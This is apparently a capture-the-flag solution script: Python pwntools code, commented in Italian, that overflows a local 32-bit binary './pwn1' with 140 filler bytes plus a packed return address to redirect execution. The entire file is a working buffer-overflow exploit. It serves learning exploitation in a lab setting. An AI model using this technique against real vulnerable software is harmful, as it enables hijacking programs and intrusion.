from pwn import *

garbage = 'a' * 140
target_address = 0x080484ad
address = p32(target_address) #utilizzo p32 perchè il programma è a 32bit (di solito uso p64(...))
msgin = garbage.encode('ascii') + address #posso usare anche b'a' ... senza encode ascii

p = process('./pwn1')
p.sendline(msgin)
p.interactive()
